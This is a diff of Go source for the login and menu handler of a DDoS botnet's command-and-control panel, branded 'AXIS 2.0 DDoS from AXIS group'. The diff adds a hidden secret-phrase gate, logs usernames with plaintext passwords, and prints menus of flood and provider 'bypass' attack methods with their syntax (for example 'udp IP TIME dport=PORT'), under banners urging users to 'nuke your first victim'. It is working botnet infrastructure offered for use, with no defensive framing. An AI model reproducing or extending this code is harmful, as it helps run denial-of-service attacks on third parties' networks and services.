@@ -28,11 +28,31 @@ func (this *Admin) Handle() {
 		this.conn.Write([]byte("\033[?1049l"))
 	}()
 
-	// Get username
+	// Get secret (anti-crash)
 	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
-	this.conn.Write([]byte("\x1b[1;32m             ╔═╗═╗ ╦╦╔═╗\r\n"))
+	this.conn.Write([]byte("\x1b[1;30m"))
+	secret, err := this.ReadLine(false)
+	if err != nil {
+		return
+	}
+
+	// anti crash
+	if len(secret) > 20 {
+		return
+	}
+
+	if secret != "AXIS20" {
+		return
+	}
+
+	// Get username
+	this.conn.Write([]byte(fmt.Sprintf("\033]0;AXIS 2.0 Login Screen | 5 Seconds To Login\007")))
+	this.conn.SetDeadline(time.Now().Add(5 * time.Second))
+	this.conn.Write([]byte("\033[2J\033[1H"))
+	this.conn.Write([]byte("\r\n"))
+	this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
 	this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
-	this.conn.Write([]byte("\x1b[1;32m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
+	this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
 	this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
 	this.conn.Write([]byte("\x1b[1;32m  go on and nuke your first victim\r\n"))
 	this.conn.Write([]byte("\x1b[1;35mUsername\x1b[1;35m: \x1b[0m"))
@@ -42,8 +62,8 @@ func (this *Admin) Handle() {
 	}
 
 	// Get password
-	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
-	this.conn.Write([]byte("\x1b[1;32mPassword\x1b[1;32m: \x1b[0m"))
+	this.conn.SetDeadline(time.Now().Add(7 * time.Second))
+	this.conn.Write([]byte("\033[01;37mPassword\033[01;36m:\033[01;37m \033[1;33m"))
 	password, err := this.ReadLine(true)
 	if err != nil {
 		return
@@ -51,32 +71,51 @@ func (this *Admin) Handle() {
 
 	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
 	this.conn.Write([]byte("\r\n"))
+	spinBuf := []byte{'-', '\\', '|', '/'}
+	for i := 0; i < 15; i++ {
+		this.conn.Write(append([]byte("\r\033[01;37mChecking your information\033[01;36m.\033[01;37m \033[01;37mPlease wait\033[01;36m...\033[01;37m \033[01;36m"), spinBuf[i % len(spinBuf)]))
+		time.Sleep(time.Duration(300) * time.Millisecond)
+	}
+	this.conn.Write([]byte("\r\n"))
 
+	//if credentials are incorrect output error and close session
 	var loggedIn bool
 	var userInfo AccountInfo
 	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
-		this.conn.Write([]byte("\r\033[00;32mInvalid Credentials. AXIS On Ur Way!\r\n"))
+		this.conn.Write([]byte("\r\033[00;31mInvalid Credentials! \033[01;37mAXIS will be on your way soon!\r\n"))
 		buf := make([]byte, 1)
 		this.conn.Read(buf)
 		return
 	}
 
-	// Log successful login
 	if len(username) > 0 && len(password) > 0 {
 		log.SetFlags(log.LstdFlags)
 		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
 		if err != nil {
 			fmt.Println("Error: ", err)
 		}
+		success := "successful login"
+		usernameFormat := "username:"
+		passwordFormat := "password:"
+		ipFormat := "ip:"
+		cmdSplit := "|"
 		log.SetOutput(loginLogsOutput)
-		log.Printf("| successful login | username:%s | password:%s | ip:%s", username, password, this.conn.RemoteAddr())
+		log.Println(cmdSplit, success, cmdSplit, usernameFormat, username, cmdSplit, passwordFormat, password, cmdSplit, ipFormat, this.conn.RemoteAddr())
 	}
 
-	this.conn.Write([]byte("\033[2J\033[1;1H"))
-	this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╔═╗\x1b[1;32m═╗ ╦\x1b[1;35m╦\x1b[1;32m╔═╗\x1b[1;35m Distributed\x1b[0m\r\n"))
-	this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╠═╣\x1b[1;32m╔╩╦╝\x1b[1;35m║\x1b[1;32m╚═╗\x1b[1;35m Denial\x1b[0m\r\n"))
-	this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╩ ╩\x1b[1;32m╩ ╚═\x1b[1;35m╩\x1b[1;32m╚═╝\x1b[1;35m Of Service\x1b[0m\r\n"))
-	this.conn.Write([]byte("\x1b[90m                                  AXIS 2.0 DDoS from AXIS group\r\n"))
+	this.conn.Write([]byte("\033[2J\033[1H"))
+	this.conn.Write([]byte("\033[01;37mWelcome user\033[01;36m:\033[01;37m " + username + "\r\n"))
+	this.conn.Write([]byte("\x1b[1;36m                               ╔═╗═╗ ╦╦╔═╗\r\n"))
+	this.conn.Write([]byte("\x1b[1;35m                               ╠═╣╔╩╦╝║╚═╗\r\n"))
+	this.conn.Write([]byte("\x1b[1;36m                               ╩ ╩╩ ╚═╩╚═╝\r\n"))
+	this.conn.Write([]byte("\x1b[1;35m                     AXIS 2.0 DDoS from AXIS group\r\n"))
+	this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
+	this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mWelcome to \033[01;36mAXIS\033[1;37m!                   \033[01;36m┃\r\n"))
+	this.conn.Write([]byte("\033[01;36m              ┃ \033[01;31mREAD the FUCKING RULES too buddy   \033[01;36m┃\r\n"))
+	this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mType \033[1;33mHELP\033[1;37m to see commands          \033[01;36m┃\r\n"))
+	this.conn.Write([]byte("\033[01;36m              ┃ \033[01;32mEstablished connection to \033[01;36mAXIS\033[01;32m!      \033[01;36m┃\r\n"))
+	this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
+	this.conn.Write([]byte("\r\n"))
 
 	// Start window title updater
 	go func() {
@@ -90,14 +129,17 @@ func (this *Admin) Handle() {
 			}
 
 			time.Sleep(time.Second)
-			title := fmt.Sprintf("\033]0; %d Bots | AXIS 2.0 | User: %s\007", BotCount, username)
 			if userInfo.admin == 1 {
-				title = fmt.Sprintf("\033]0; %d Bots | Admins: %d | Users: %d | Attacks: %d | AXIS 2.0 | %s\007",
-					BotCount, database.totalAdmins(), database.totalUsers(), database.fetchAttacks(), username)
+				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;AXIS 2.0 | Devices: %d | Ongoing: %d/5 | Admins: %d | Users: %d | Attacks: %d\007", BotCount, database.runningatk(), database.totalAdmins(), database.totalUsers(), database.fetchAttacks()))); err != nil {
+					this.conn.Close()
+					break
+				}
 			}
-			if _, err := this.conn.Write([]byte(title)); err != nil {
-				this.conn.Close()
-				break
+			if userInfo.admin == 0 {
+				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;AXIS 2.0 | Devices: %d | Ongoing: %d/5\007", BotCount, database.runningatk()))); err != nil {
+					this.conn.Close()
+					break
+				}
 			}
 			i++
 			if i % 60 == 0 {
@@ -109,122 +151,175 @@ func (this *Admin) Handle() {
 	for {
 		var botCatagory string
 		var botCount int
-		this.conn.Write([]byte("\x1b[1;32mAXIS\x1b[35m~# "))
+		this.conn.Write([]byte("\033[01;36m╔═\033[01;37m" + username + "@\033[01;36mAXIS\033[01;37mNet\033[01;36m══\033[1;33m$\r\n"))
+		this.conn.Write([]byte("\033[01;36m╚═\033[1;33m➢ "))
 		cmd, err := this.ReadLine(false)
-		if err != nil || cmd == "exit" || cmd == "quit" {
+		if err != nil || cmd == "exit" || cmd == "EXIT" || cmd == "QUIT" || cmd == "quit" {
 			return
 		}
 		if cmd == "" {
 			continue
 		}
-
-		// Clear screen commands
-		if cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" {
-			this.conn.Write([]byte("\033[2J\033[1;1H"))
-			this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╔═╗\x1b[1;32m═╗ ╦\x1b[1;35m╦\x1b[1;32m╔═╗\x1b[1;35m Distributed\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╠═╣\x1b[1;32m╔╩╦╝\x1b[1;35m║\x1b[1;32m╚═╗\x1b[1;35m Denial\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[0m                                   \x1b[1;35m╩ ╩\x1b[1;32m╩ ╚═\x1b[1;35m╩\x1b[1;32m╚═╝\x1b[1;35m Of Service\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[90m                                  AXIS 2.0 DDoS from AXIS group\r\n"))
+		if err != nil || cmd == "cls" || cmd == "clear" || cmd == "CLS" || cmd == "CLEAR" || cmd == "C" || cmd == "c" {
+			this.conn.Write([]byte("\033[2J\033[1H"))
+			this.conn.Write([]byte("\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
+			this.conn.Write([]byte("\033[01;36m                   ╚═╦════════════════════════════════════╦═╝      \r\n"))
+			this.conn.Write([]byte("\033[01;36m                     ║\033[1;37m - - - - Welcome to \033[01;36mAXIS\033[1;37m! - - - - \033[01;36m║        \r\n"))
+			this.conn.Write([]byte("\033[01;36m                     ║\033[1;37m \033[01;31mREAD\033[1;37m them \033[01;31mFUCKING\033[1;37m \033[1;33mRULES\033[1;37m too buddy\033[01;36m> \033[01;36m║        \r\n"))
+			this.conn.Write([]byte("\033[01;36m                 ╚══╦╩════════════════════════════════════╩╦══╝    \r\n"))
+			this.conn.Write([]byte("\033[01;36m             ╚╦═════╩══════════════════════════════════════╩═════╦╝\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ║\033[1;37m- - -Type \033[1;33mHELP\033[1;37m to see the command list- - -\033[01;36m║ \r\n"))
+			this.conn.Write([]byte("\033[01;36m              ║\033[1;37m- - You have \033[01;32mEstablished\033[1;37m connection to \033[01;36mAXIS\033[1;37m! - -\033[01;36m║ \r\n"))
+			this.conn.Write([]byte("\033[01;36m              ╚══════════════════════════════════════════════════╝ \r\n"))
+			this.conn.Write([]byte("\r\n"))
+			continue
+		}
+		if cmd == "help" || cmd == "HELP" || cmd == "cmd" || cmd == "CMD" || cmd == "cmds" || cmd == "CMDS" || cmd == "?" {
+			this.conn.Write([]byte("\033[2J\033[1H"))
+			this.conn.Write([]byte("\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mMETHODS\x1b[1;37m  - Shows all attack methods  \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mBYPASS\x1b[1;37m   - Shows bypass methods       \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mPORTS\x1b[1;37m    - Shows common ports         \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mRULES\x1b[1;37m    - Read the rules             \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mADMIN\x1b[1;37m    - Admin menu                 \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mTOOLS\x1b[1;37m    - Network tools              \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mCLEAR\x1b[1;37m    - Clear screen               \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
+			this.conn.Write([]byte("\r\n"))
 			continue
 		}
 
-		// Help command - AXIS style
-		if cmd == "HELP" || cmd == "help" || cmd == "?" {
-			this.conn.Write([]byte("\x1b[1;90m            --> | Help | <--     \r\n"))
-			this.conn.Write([]byte("\x1b[1;35m╔═════════════════════════════════════╗\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ ports  \x1b[90m- \x1b[0mShows Ports                \x1b[1;35m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ bypass  \x1b[90m- \x1b[0mShows Bypass Commands     \x1b[1;32m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ methods \x1b[90m- \x1b[0mShows Attack Commands     \x1b[1;35m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ admin   \x1b[90m- \x1b[0mShows Admin Commands      \x1b[1;32m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m╚═════════════════════════════════════╝\x1b[0m\r\n"))
-			continue
-		}
-
-		// Admin command - AXIS style
+		// Admin command
 		if userInfo.admin == 1 && (cmd == "ADMIN" || cmd == "admin") {
-			this.conn.Write([]byte("\x1b[1;90m          --> | Admin HUB | <-- \r\n"))
-			this.conn.Write([]byte("\x1b[1;35m╔═════════════════════════════════════╗\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ adduser \x1b[90m- \x1b[0mCreate a Regular Account  \x1b[1;35m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ addadmin \x1b[90m- \x1b[0mCreate an Admin Account  \x1b[1;32m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ deluser \x1b[90m- \x1b[0mRemove an Account         \x1b[1;35m║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m╚═════════════════════════════════════╝\x1b[0m\r\n"))
+			this.conn.Write([]byte(" \033[01;36m╔═══════════════════════════════════╗\r\n"))
+			this.conn.Write([]byte(" \033[01;36m║ \033[1;33mADDUSER  \033[01;36m->\033[1;37m Add Basic client menu  \033[01;36m║\r\n"))
+			this.conn.Write([]byte(" \033[01;36m║ \033[1;33mADDADMIN \033[01;36m->\033[1;37m Add Admin client menu  \033[01;36m║\r\n"))
+			this.conn.Write([]byte(" \033[01;36m║ \033[1;33mDELUSER  \033[01;36m->\033[1;37m Remove client menu     \033[01;36m║\r\n"))
+			this.conn.Write([]byte(" \033[01;36m╚═══════════════════════════════════╝\r\n"))
 			continue
 		}
 
-		// Methods command - AXIS style with ALL methods
+		// Methods command
 		if cmd == "METHODS" || cmd == "methods" {
-			this.conn.Write([]byte("\x1b[1;90m                --> | Methods | <--                     \r\n"))
-			this.conn.Write([]byte("\x1b[1;35m╔═══════════════════════════════════════════════════════╗\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mUDP Floods:\x1b[1;32m                                        ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mudp\x1b[1;32m, \x1b[1;33mudpplain\x1b[1;32m, \x1b[1;33mstd\x1b[1;32m, \x1b[1;33mnudp\x1b[1;32m, \x1b[1;33mudphex\x1b[1;32m, \x1b[1;33msocket-raw\x1b[1;32m         ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mudp-strong\x1b[1;32m, \x1b[1;33mhex-flood\x1b[1;32m, \x1b[1;33mstrong-hex\x1b[1;32m, \x1b[1;33movhudp\x1b[1;32m, \x1b[1;33mcudp\x1b[1;32m, \x1b[1;33micee\x1b[1;32m      ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mrandhex\x1b[1;32m, \x1b[1;33movh\x1b[1;32m, \x1b[1;33movhdrop\x1b[1;32m, \x1b[1;33mnfo\x1b[1;32m, \x1b[1;33msamp\x1b[1;32m                     ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mTCP Floods:\x1b[1;32m                                        ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mtcp\x1b[1;32m, \x1b[1;33msyn\x1b[1;32m, \x1b[1;33mack\x1b[1;32m, \x1b[1;33mstomp\x1b[1;32m, \x1b[1;33mhex\x1b[1;32m, \x1b[1;33mstdhex\x1b[1;32m, \x1b[1;33mxmas\x1b[1;32m          ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mtcpall\x1b[1;32m, \x1b[1;33mtcpfrag\x1b[1;32m, \x1b[1;33masyn\x1b[1;32m, \x1b[1;33musyn\x1b[1;32m, \x1b[1;33mackerpps\x1b[1;32m               ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mtcp-mix\x1b[1;32m, \x1b[1;33mtcpbypass\x1b[1;32m, \x1b[1;33mnfolag\x1b[1;32m, \x1b[1;33movhnuke\x1b[1;32m, \x1b[1;33mraw\x1b[1;32m            ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mSpecial:\x1b[1;32m                                             ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mvse\x1b[1;32m, \x1b[1;33mdns\x1b[1;32m, \x1b[1;33mgreip\x1b[1;32m, \x1b[1;33mgreeth\x1b[1;32m, \x1b[1;33mcf\x1b[1;32m                         ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mHTTP:\x1b[1;32m                                                ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║   \x1b[1;33mhttp\x1b[1;32m, \x1b[1;33mhttps\x1b[1;32m                                       ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m╠═══════════════════════════════════════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;37mExample: \x1b[1;33mudp <ip> <time> dport=<port>\x1b[1;32m              ║\x1b[0m\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m╚═══════════════════════════════════════════════════════╝\x1b[0m\r\n"))
+			this.conn.Write([]byte("\033[2J\033[1H"))
+			this.conn.Write([]byte("\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mLAYER 4\x1b[1;36m ┃\033[1;37m tcp syn ack stomp hex tcpall    \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37m       \x1b[1;36m ┃\033[1;37m tcpfrag asyn usyn ackerpps      \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mLAYER 3\x1b[1;36m ┃\033[1;37m udp udpplain std nudp udphex      \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37m       \x1b[1;36m ┃\033[1;37m vse dns greip greeth randhex     \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mLAYER 7\x1b[1;36m ┃\033[1;37m http https cf nfo               \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mSPECIAL\x1b[1;36m ┃\033[1;37m ovh ovhudp ovhdrop tcpbypass     \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37m       \x1b[1;36m ┃\033[1;37m nfolag ovhnuke stomp raw          \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
+			this.conn.Write([]byte("\033[01;36m              \033[1;32mEXAMPLE:\033[1;37m udp \033[1;31mIP TIME \033[1;33mdport=\033[1;31mPORT\r\n"))
+			this.conn.Write([]byte("\r\n"))
 			continue
 		}
 
-		// Bypass command - AXIS style with ALL bypasses
+		// Bypass command
 		if cmd == "bypass" || cmd == "BYPASS" {
-			this.conn.Write([]byte("\x1b[1;90m                --> | Bypasses | <--                    \r\n"))
-			this.conn.Write([]byte("\x1b[1;32m╔═══════════════════════════════════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;33mcf [IP] [TIME] domain=[DOMAIN]\x1b[1;35m   - CF Bypass       ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mnfolag [IP] [TIME] dport=[PORT]\x1b[1;32m  - NFO Lag Bypass  ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;33movhnuke [IP] [TIME] dport=[PORT]\x1b[1;35m - OVH Nuke        ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33movh [IP] [TIME] dport=[PORT]\x1b[1;32m     - OVH Bypass      ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;33movhudp [IP] [TIME] dport=[PORT]\x1b[1;35m  - OVH UDP Bypass  ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33movhdrop [IP] [TIME] dport=[PORT]\x1b[1;32m - OVH Drop        ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;33mnfo [IP] [TIME] dport=[PORT]\x1b[1;35m     - NFO Bypass      ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ \x1b[1;33mtcpbypass [IP] [TIME] dport=[PORT]\x1b[1;32m - TCP Bypass      ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ \x1b[1;33mstomp [IP] [TIME] dport=[PORT]\x1b[1;35m   - TCP Stomp       ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m╠═══════════════╦═══════════════╦═════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ CF Port: 80   ║  AXIS 2.0     ║  --> | Rules | <--  ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ NFO Port: 22  ║  FUCK ICE     ╠═════════════════════╣\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ OVH Port: 995 ║  Made By AXIS ║  Don't spam!        ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m╠═══════════════╩═══════════════╣  Don't share!       ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ iplookup - Looks up an IP     ║  Don't Bother!      ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ portscan - Portscans an IP    ║                     ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m╚═══════════════════════════════╩═════════════════════╝\r\n"))
+			this.conn.Write([]byte("\033[2J\033[1H"))
+			this.conn.Write([]byte("\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mcf\x1b[1;37m [IP] [TIME] domain=[DOMAIN]       \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mnfolag\x1b[1;37m [IP] [TIME] dport=[PORT]      \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33movhnuke\x1b[1;37m [IP] [TIME] dport=[PORT]    \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33movh\x1b[1;37m [IP] [TIME] dport=[PORT]        \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33movhudp\x1b[1;37m [IP] [TIME] dport=[PORT]     \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33movhdrop\x1b[1;37m [IP] [TIME] dport=[PORT]    \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mnfo\x1b[1;37m [IP] [TIME] dport=[PORT]        \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mtcpbypass\x1b[1;37m [IP] [TIME] dport=[PORT]  \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mstomp\x1b[1;37m [IP] [TIME] dport=[PORT]      \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
+			this.conn.Write([]byte("\033[01;36m              \033[1;32mEXAMPLE:\033[1;37m cf \033[1;31mIP TIME \033[1;33mdomain=\033[1;31mexample.com\r\n"))
+			this.conn.Write([]byte("\r\n"))
 			continue
 		}
 
-		// Ports command - AXIS style
+		// Ports command
 		if cmd == "PORTS" || cmd == "ports" {
-			this.conn.Write([]byte("\x1b[1;90m     --> | Ports | <--               \r\n"))
-			this.conn.Write([]byte("\x1b[1;32m╔═════════════════════════╗\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ PORT: 21 = SFTP         ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ PORT: 22 = SSH          ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ PORT: 23 = TELNET       ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ PORT: 25 = SMTP         ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ PORT: 53 = DNS          ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ PORT: 69 = TFTP         ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ PORT: 80 = HTTP         ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ PORT: 443 = HTTPS       ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ PORT: 3074 = XBOX       ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;32m║ PORT: 5060 = RTP        ║\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m║ PORT: 9307 = PLAYSTATION║\r\n"))
-			this.conn.Write([]byte("\x1b[1;35m╚═════════════════════════╝\r\n"))
+			this.conn.Write([]byte("\033[2J\033[1H"))
+			this.conn.Write([]byte("\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
+			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
+			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m21\x1b[1;37m=FTP   \033[1;33m22\x1b[1;37m=SSH   \033[1;33m23\x1b[1;37m=TELNET  \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m25\x1b[1;37m=SMTP  \033[1;33m53\x1b[1;37m=DNS   \033[1;33m80\x1b[1;37m=HTTP    \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m443\x1b[1;37m=HTTPS \033[1;33m995\x1b[1;37m=OVH  \033[1;33m3074\x1b[1;37m=XBOX    \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m5060\x1b[1;37m=RTP  \033[1;33m9307\x1b[1;37m=PS4/PS5          \033[01;36m┃\r\n"))
+			this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
+			this.conn.Write([]byte("\r\n"))
 			continue
 		}
 
 		// Rules/Info command
 		if cmd == "RULES" || cmd == "rules" || cmd == "INFO" || cmd == "info" {
